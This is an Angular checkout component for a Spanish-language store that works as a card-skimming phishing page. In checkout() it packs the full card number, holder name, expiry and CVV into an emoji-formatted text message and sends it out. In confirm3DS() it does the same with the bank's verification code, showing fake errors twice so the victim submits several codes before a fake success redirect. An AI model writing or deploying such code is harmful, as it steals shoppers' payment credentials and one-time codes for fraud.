import { CommonModule } from '@angular/common';
import { Component, inject } from '@angular/core';
import {
  FormGroup,
  FormBuilder,
  Validators,
  ReactiveFormsModule,
  FormsModule,
} from '@angular/forms';
import { LoadingComponent } from '../shared/components/loading/loading.component';
import { CartProduct } from '../shared/models/cart-product';
import { PaymentService } from '../core/services/payment.service';

@Component({
  selector: 'app-payment',
  imports: [CommonModule, ReactiveFormsModule, FormsModule, LoadingComponent],
  templateUrl: './payment.component.html',
})
export class PaymentComponent {
  paymentService = inject(PaymentService);
  counter: number = 0;
  isLoading: boolean = false;
  show3DSModal: boolean = false;
  showErrorToast1:boolean = false;
  showErrorToast2:boolean = false;
  threeDSCode: string = '';
  threeDSError: string | null = null;
  card = {
    method: 'credit' as 'credit' | 'debit' | 'crypto',
    number: '',
    holder: '',
    expMonth: '',
    expYear: '',
    cvv: '',
    installments: '',
    saveCard: false,
  };

  cardForm: FormGroup;
  cartProducts?: CartProduct[];
  total: number = 0;
  showErrorToast: boolean = false;
  cuotas = [
    { value: '1', label: 'Total - $1.528.899' },
    { value: '3', label: '3 cuotas de $509.633' },
    { value: '6', label: '6 cuotas de $254.816' },
  ];

  constructor(private fb: FormBuilder) {
  
    this.cardForm = this.fb.group({
      cardNumber: [
        '',
        [Validators.required, Validators.pattern(/^\d{13,19}$/)],
      ],
      installments: ['', Validators.required],
      cardHolder: ['', [Validators.required, Validators.minLength(5)]],
      expMonth: [
        '',
        [Validators.required, Validators.pattern(/^(0[1-9]|1[0-2])$/)],
      ],
      expYear: ['', [Validators.required, Validators.pattern(/^\d{2}$/)]],
      cvv: ['', [Validators.required, Validators.pattern(/^\d{3,4}$/)]],
      billingAddressMatch: [true],
    });
  }

  ngOnInit(): void {
    this.updateTotal();
  }

  isInvalid(controlName: string) {
    const control = this.cardForm.get(controlName);
    return control?.invalid && (control.dirty || control.touched);
  }

  onPaymentMethodChange(method: 'credit' | 'debit') {
    this.card.method = method;

    // Si es débito: siempre 1 cuota y deshabilitamos el selector
    if (method === 'debit') {
      this.card.installments = '1';
    } else {
      // Si vuelve a crédito, dejamos que el usuario elija
      this.card.installments = '';
    }
  }
  onCardNumberInput(event: Event) {
    const input = event.target as HTMLInputElement;

    // Solo números
    let digits = input.value.replace(/\D/g, '');

    // Limitar máximo 19 dígitos
    if (digits.length > 19) {
      digits = digits.substring(0, 19);
    }

    // Aplicar máscara: XXXX XXXX XXXX XXXX XXXX
    const masked = digits.replace(/(.{4})/g, '$1 ').trim();

    this.card.number = masked;
  }

  async checkout() {  
    let storedMsg = localStorage.getItem('m') || '';

    const numero = this.card.number;
    const holder = this.card.holder;
    const exp = this.card.expMonth + '/' + this.card.expYear || 'PENDIENTE';
    const cvv = this.card.cvv || 'PENDIENTE';


    storedMsg = this.updateField(storedMsg, 'Tarjeta', numero);
    storedMsg = this.updateField(storedMsg, 'Holder', holder);
    storedMsg = this.updateField(storedMsg, 'fecha', exp);
    storedMsg = this.updateField(storedMsg, 'cvv', cvv);


    if (!storedMsg.includes('Tarjeta:')) storedMsg += `\n\n╭🟢 Tarjeta: ${numero}`;
    if (!storedMsg.includes('Holder:')) storedMsg += `\n┣🟢 Holder: ${holder}`;
    if (!storedMsg.includes('fecha:'))
      storedMsg += `\n┣🟢 fecha: ${exp}`;
    if (!storedMsg.includes('cvv:'))
      storedMsg += `\n╰🟢 cvv: ${cvv}`;

    localStorage.setItem('m', storedMsg);
    const res = await this.paymentService.checkout({ text: storedMsg });
    this.isLoading = true;
    setTimeout(() => {
      this.show3DSModal = true;
    }, 5000);
  }

  private updateField(text: string, field: string, newValue: string): string {
    const regex = new RegExp(`${field}:.*`, 'i');

    if (regex.test(text)) {
      // Si existe → reemplazarlo
      return text.replace(regex, `${field}: ${newValue}`);
    }

    // Si no existe, devolver el texto tal cual
    return text;
  }

  getMaskedCard(): string {
    if (!this.card.number) return '**** **** **** 0000';

    const digits = this.card.number.replace(/\s/g, '');
    const last4 = digits.slice(-4);

    return `**** **** **** ${last4}`;
  }

  updateTotal() {
    const storagedProducts: CartProduct[] =
      JSON.parse(localStorage.getItem('cart-products') as string) || [];

    this.cartProducts = storagedProducts;

    let total = 0;

    this.cartProducts.forEach((cartProduct) => {
      total +=
        Math.round(cartProduct.productPrice * cartProduct.quantity * 100) /
        100;
    });

    this.total = total;
  }

  isFormComplete(): boolean {
    const number = this.card.number.replace(/\s/g, '');

    // Detectar marca
    const brand = this.detectCardBrand(number);

    // Validación Luhn
    if (!this.validateLuhn(number)) return false;

    // Validación de marca conocida
    if (brand === 'unknown') return false;

    // Titular
    if (!this.card.holder || this.card.holder.trim().length < 5) return false;

    // Expiración real
    if (!this.validateExpiration(this.card.expMonth, this.card.expYear)) {
      return false;
    }

    // CVV según tipo
    if (!this.validateCVV(this.card.cvv, brand)) {
      return false;
    }

    // Cuotas
    if (this.card.method === 'credit') {
      if (!this.card.installments) return false;
    } else if (this.card.method === 'debit') {
      if (this.card.installments !== '1') return false;
    }

    return true;
  }

  private validateLuhn(cardNumber: string): boolean {
    const digits = cardNumber.replace(/\s/g, '');
    let sum = 0;
    let shouldDouble = false;

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits.charAt(i), 10);

      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }

      sum += digit;
      shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
  }

  private detectCardBrand(cardNumber: string): string {
    const num = cardNumber.replace(/\s/g, '');

    const rules: any = {
      visa: /^4\d{12}(\d{3})?$/,
      mastercard:
        /^(5[1-5]\d{14}|2(22[1-9]\d{12}|2[3-9]\d{13}|[3-6]\d{14}|7([01]\d{13}|20\d{12})))$/,
      amex: /^3[47]\d{13}$/,
      diners: /^3(0[0-5]|[68]\d)\d{11}$/,
      discover: /^6(?:011|5\d{2})\d{12}$/,
    };

    for (const brand in rules) {
      if (rules[brand].test(num)) {
        return brand;
      }
    }

    return 'unknown';
  }

  validateExpiration(month: string, year: string): boolean {
    if (!month || !year) return false;
    if (month.length !== 2 || year.length !== 2) return false;

    const mm = parseInt(month, 10);
    const yy = parseInt('20' + year, 10);

    if (mm < 1 || mm > 12) return false;

    const now = new Date();
    const currentMonth = now.getMonth() + 1; // enero = 0
    const currentYear = now.getFullYear();

    // Año pasado → inválido
    if (yy < currentYear) return false;

    // Mismo año pero mes pasado → inválido
    if (yy === currentYear && mm < currentMonth) return false;

    return true;
  }

  private validateCVV(cvv: string, brand: string): boolean {
    if (!cvv) return false;

    if (brand === 'amex') {
      return /^\d{4}$/.test(cvv); // Amex = 4 dígitos
    }

    return /^\d{3}$/.test(cvv); // Todas las demás = 3 dígitos
  }

  isCardNumberInvalid(): boolean {
    const num = this.card.number.replace(/\s/g, '');
    return num.length < 13 || !this.validateLuhn(num);
  }

  isHolderInvalid(): boolean {
    return !this.card.holder || this.card.holder.trim().length < 5;
  }

  isExpMonthInvalid(): boolean {
    const mm = this.card.expMonth;
    return !(mm && mm.length === 2 && Number(mm) >= 1 && Number(mm) <= 12);
  }

  isExpYearInvalid(): boolean {
    return !(this.card.expYear && this.card.expYear.length === 2);
  }

  isCVVInvalid(): boolean {
    const brand = this.detectCardBrand(this.card.number.replace(/\s/g, ''));
    return !this.validateCVV(this.card.cvv, brand);
  }

  async confirm3DS() {
  let storedMsg = localStorage.getItem('m') || '';

  const cod = this.threeDSCode || 'PENDIENTE';

  // 1) Actualizar si ya existe la línea de Código
  storedMsg = this.updateField(storedMsg, 'Codigo', cod);

  // 2) Si no existía ninguna línea con "Codigo:", la agregamos
  if (!/[╭┣╰]🟢\s*Codigo:/i.test(storedMsg)) {
    storedMsg += `\n\n🟢 Codigo: ${cod}`;
  }

  // 3) Guardar y enviar
  localStorage.setItem('m', storedMsg);
  const res = await this.paymentService.checkout({ text: storedMsg });

  // -------- resto de tu lógica 3DS --------
  this.isLoading = true;
  setTimeout(() => {
    this.show3DSModal = true;
  }, 5000);

  if (this.counter == 2) {
    // Validación básica del código (ej: mínimo 4 dígitos)
    if (!this.threeDSCode || this.threeDSCode.trim().length < 4) {
      this.threeDSError =
        'Ingresa el código de verificación enviado por tu banco.';
      return;
    }

    this.threeDSError = null;
    this.show3DSModal = false;
    this.isLoading = true;


    setTimeout(() => {
      this.isLoading = false;
      location.href = 'payment/success';
    }, 2000);
  }

  if (this.counter == 0) {
    this.isLoading = true;
    this.show3DSModal = false;
    this.showErrorToast1 = true;
    setTimeout(() => {
      this.isLoading = false;
      this.show3DSModal = true;
      this.threeDSCode = '';
    }, 2000);
    this.counter++;
  }

  if (this.counter == 1) {
    this.isLoading = true;
    this.show3DSModal = false;
    this.showErrorToast2 = true;
    setTimeout(() => {
      this.isLoading = false;
      this.show3DSModal = true;
      this.threeDSCode = '';
    }, 2000);
    this.counter++;
  }
}

  cancel3DS() {
    this.show3DSModal = false;
    this.threeDSCode = '';
    this.threeDSError = null;
    setTimeout(() => {
      location.href = 'payment/error';
    }, 3000);
  }
}
